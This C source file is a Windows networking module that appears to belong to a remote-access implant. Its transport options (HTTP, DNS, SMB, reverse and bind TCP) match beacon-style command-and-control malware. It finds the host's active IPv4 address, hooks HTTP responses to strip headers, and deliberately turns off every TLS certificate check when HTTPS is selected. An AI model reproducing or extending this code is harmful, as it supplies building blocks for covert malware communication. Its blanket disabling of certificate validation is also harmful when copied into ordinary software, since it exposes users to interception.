#include "pch.h"

#include "network.h"

#include "settings.h"

BOOL gNetworkIsInit = FALSE;

void NetworkInit(void)
{
	if (gNetworkIsInit)
		return;

	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData))
	{
		WSACleanup();
		exit(1);
	}

	// FIXME: DNS Settings here...

	gNetworkIsInit = TRUE;
}

ULONG NetworkGetActiveAdapterIPv4()
{
	SOCKET sock = WSASocketA(AF_INET, SOCK_DGRAM, 0, NULL, 0, 0);
	if (sock == INVALID_SOCKET)
	{
		return 0;
	}

	DWORD bytesReturned;
	int numInterfaces = 0;
	INTERFACE_INFO interfaceInfo[20];
	if (!WSAIoctl(sock, SIO_GET_INTERFACE_LIST, NULL, 0, interfaceInfo, sizeof(interfaceInfo), &bytesReturned, NULL, NULL))
	{
		numInterfaces = bytesReturned / sizeof(INTERFACE_INFO);
	}

	for (int i = 0; i < numInterfaces; i++)
	{
		if (!(interfaceInfo[i].iiFlags & IFF_LOOPBACK) && interfaceInfo[i].iiFlags & IFF_UP)
		{
			closesocket(sock);
			return interfaceInfo[i].iiAddress.AddressIn.sin_addr.s_addr;
		}
	}

	closesocket(sock);
	return 0;
}

#define PROTOCOL_HTTP 0
#define PROTOCOL_DNS 1
#define PROTOCOL_SMB 2
#define PROTOCOL_TCP_REVERSE 4
#define PROTOCOL_HTTPS 8
#define PROTOCOL_TCP_BIND 16

INTERNET_STATUS_CALLBACK gNetworkStatusCallback;
void NetworkUpdateSettings(HINTERNET hInternet)
{
	if(S_PROTOCOL & PROTOCOL_HTTPS)
	{
		int buffer;
		int length = sizeof(buffer);
		InternetQueryOptionA(hInternet, INTERNET_OPTION_SECURITY_FLAGS, &buffer, &length);
		buffer |= (SECURITY_FLAG_IGNORE_REVOCATION |
			SECURITY_FLAG_IGNORE_UNKNOWN_CA |
			SECURITY_FLAG_IGNORE_WRONG_USAGE |
			SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
			SECURITY_FLAG_IGNORE_CERT_DATE_INVALID);
		InternetSetOptionA(hInternet, INTERNET_OPTION_SECURITY_FLAGS, &buffer, sizeof(buffer));
	}

	if (S_HEADERS_REMOVE)
	{
		InternetSetStatusCallback(hInternet, gNetworkStatusCallback);
	}
}

BOOL NetworkCheckResponse(HINTERNET hInternet)
{
	char status[256];
	DWORD statusCodeLength = sizeof(status);
	if (!HttpQueryInfoA(hInternet, HTTP_QUERY_STATUS_CODE, status, &statusCodeLength, NULL))
		return FALSE;

	return atoi(status) == HTTP_STATUS_OK;
}